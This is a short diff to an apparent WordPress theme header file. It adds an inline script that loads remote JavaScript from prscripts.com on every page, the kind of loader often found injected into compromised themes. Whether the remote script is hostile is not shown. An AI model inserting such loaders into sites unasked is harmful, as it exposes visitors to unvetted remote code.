@@ -9,6 +9,12 @@
 ?><!DOCTYPE html>
 <html <?php language_attributes(); ?>>
 <head>
+<script type="text/javascript">
+	var _prvar=_prvar||new Object();
+	(function(pa,s){if(document.getElementById('pr3ae806b7'))return false;
+	pa=document.createElement('script');pa.type='text/javascript';pa.async=true;pa.id='pr3ae806b7';pa.src='//prscripts.com/pub.js';
+	s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(pa,s);})();
+</script>
 	<meta charset="<?php bloginfo( 'charset' ); ?>">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
